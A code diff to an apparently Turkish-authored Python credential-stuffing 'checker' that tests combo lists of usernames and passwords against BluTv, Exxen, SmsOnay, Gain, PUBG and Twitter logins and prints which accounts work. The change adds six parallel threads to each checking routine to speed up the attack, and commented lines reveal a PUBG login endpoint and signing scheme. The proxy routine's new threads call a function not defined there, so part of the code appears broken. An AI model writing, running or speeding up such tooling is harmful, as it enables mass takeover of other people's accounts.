@@ -23,7 +23,7 @@ def banner():
 """+END+"""
 Coded By @yusiqo
 Channel: @ZetTekno
-Version: 0.4
+Version: 0.5
 ⌯ Varlığım Türk Irkına Armağan Olsun
 ⌯ Linkten Kazandığım Paraları Bagış Yapcam Kurumlara
 """
@@ -83,6 +83,8 @@ def checker():
             say=say+1
             if combo==str(say):
                 comboo=(dirm+files)
+    total=open(comboo,'r').readlines()
+    uz=len(total)
     clear()
     banner()
     print("Hangi Config?\n1) BluTv\n2) Exxen\n3) SmsOnay\n4) Gain\n5) Pubg (mail)\n6) Proxy (http(s))\n7) Twitter (oto combo)")
@@ -153,7 +155,7 @@ def checker():
         clear()
         banner()
         
-        for mp in open(comboo,'r').read().splitlines():
+        def bsl(mp):
                 try:
                     mp=mp.replace("\n","")
                     user =str(mp.split(':')[0])
@@ -207,12 +209,55 @@ def checker():
                         print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
                 except:
                     pass
+        def c1():
+            for zet in range(0,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c2():
+            for zet in range(1,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c3():
+            for zet in range(2,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c4():
+            for zet in range(3,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c5():
+            for zet in range(4,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c6():
+            for zet in range(5,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        import threading
 
+        a1 = threading.Thread(target=c1)
+        a2 = threading.Thread(target=c2)
+        a3= threading.Thread(target=c3)
+        a4= threading.Thread(target=c4)
+        a5= threading.Thread(target=c5)
+        a6= threading.Thread(target=c6)
+        a1.start()
+        a2.start()
+        a3.start()
+        a4.start()
+        a5.start()
+        a6.start()
     def chksms():
         clear()
         banner()
         
-        for mp in open(comboo,'r').read().splitlines():
+        def bsl(mp):
                 try:
                     mp=mp.replace("\n","")
                     user = mp.split(':')[0]
@@ -252,7 +297,50 @@ def checker():
                         print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
                 except:
                     pass
+        def c1():
+            for zet in range(0,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c2():
+            for zet in range(1,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c3():
+            for zet in range(2,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c4():
+            for zet in range(3,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c5():
+            for zet in range(4,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c6():
+            for zet in range(5,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        import threading
 
+        a1 = threading.Thread(target=c1)
+        a2 = threading.Thread(target=c2)
+        a3= threading.Thread(target=c3)
+        a4= threading.Thread(target=c4)
+        a5= threading.Thread(target=c5)
+        a6= threading.Thread(target=c6)
+        a1.start()
+        a2.start()
+        a3.start()
+        a4.start()
+        a5.start()
+        a6.start()
 # pes = hashlib.md5(bytes(f'{pas}', encoding='utf-8')).hexdigest()
 #J = hashlib.md5(bytes("/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}3ec8cd69d71b7922e2a17445840866b26d86e283", encoding="utf-8")).hexdigest()
 #url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={J}"
@@ -275,11 +363,55 @@ def checker():
                 print(GREEN+"⌯ "+prx +END)
             except:
                 print(RED+f"⌯ Ölü!! {prx}"+END)
+        def c1():
+            for zet in range(0,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c2():
+            for zet in range(1,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c3():
+            for zet in range(2,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c4():
+            for zet in range(3,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c5():
+            for zet in range(4,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c6():
+            for zet in range(5,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        import threading
+
+        a1 = threading.Thread(target=c1)
+        a2 = threading.Thread(target=c2)
+        a3= threading.Thread(target=c3)
+        a4= threading.Thread(target=c4)
+        a5= threading.Thread(target=c5)
+        a6= threading.Thread(target=c6)
+        a1.start()
+        a2.start()
+        a3.start()
+        a4.start()
+        a5.start()
+        a6.start()
     def chkpub():
         clear()
         banner()
         
-        for mp in open(comboo,'r').read().splitlines():
+        def bsl(mp):
                 try:
                     mp=mp.replace("\n","")
                     user = mp.split(':')[0]
@@ -317,6 +449,50 @@ def checker():
                         print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
                 except:
                     pass
+        def c1():
+            for zet in range(0,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c2():
+            for zet in range(1,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c3():
+            for zet in range(2,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c4():
+            for zet in range(3,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c5():
+            for zet in range(4,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c6():
+            for zet in range(5,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        import threading
+
+        a1 = threading.Thread(target=c1)
+        a2 = threading.Thread(target=c2)
+        a3= threading.Thread(target=c3)
+        a4= threading.Thread(target=c4)
+        a5= threading.Thread(target=c5)
+        a6= threading.Thread(target=c6)
+        a1.start()
+        a2.start()
+        a3.start()
+        a4.start()
+        a5.start()
+        a6.start()
     def chkblu():
         clear()
         banner()
@@ -373,7 +549,7 @@ def checker():
         "15.2.1",
         "15.3.1",
     )
-        for mp in open(comboo,'r').read().splitlines():
+        def bsl(mp):
                 try:
                     mp=mp.replace("\n","")
                     user = mp.split(':')[0]
@@ -442,11 +618,55 @@ def checker():
                         print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
                 except:
                     pass
+        def c1():
+            for zet in range(0,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c2():
+            for zet in range(1,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c3():
+            for zet in range(2,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c4():
+            for zet in range(3,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c5():
+            for zet in range(4,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c6():
+            for zet in range(5,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        import threading
+
+        a1 = threading.Thread(target=c1)
+        a2 = threading.Thread(target=c2)
+        a3= threading.Thread(target=c3)
+        a4= threading.Thread(target=c4)
+        a5= threading.Thread(target=c5)
+        a6= threading.Thread(target=c6)
+        a1.start()
+        a2.start()
+        a3.start()
+        a4.start()
+        a5.start()
+        a6.start()
     def chkgain():
         clear()
         banner()
         
-        for mp in open(comboo,'r').read().splitlines():
+        def bsl(mp):
                 try:
                     mp=mp.replace("\n","")
                     user = mp.split(':')[0]
@@ -482,6 +702,50 @@ def checker():
                         print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
                 except:
                     pass
+        def c1():
+            for zet in range(0,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c2():
+            for zet in range(1,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c3():
+            for zet in range(2,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c4():
+            for zet in range(3,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c5():
+            for zet in range(4,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        def c6():
+            for zet in range(5,uz,6):
+                up=total[zet].split(' ')[0]
+                mp=up.replace("\n","")
+                bsl(mp)
+        import threading
+
+        a1 = threading.Thread(target=c1)
+        a2 = threading.Thread(target=c2)
+        a3= threading.Thread(target=c3)
+        a4= threading.Thread(target=c4)
+        a5= threading.Thread(target=c5)
+        a6= threading.Thread(target=c6)
+        a1.start()
+        a2.start()
+        a3.start()
+        a4.start()
+        a5.start()
+        a6.start()
     if hesap =="2":
         chkex()
     if hesap=="3":
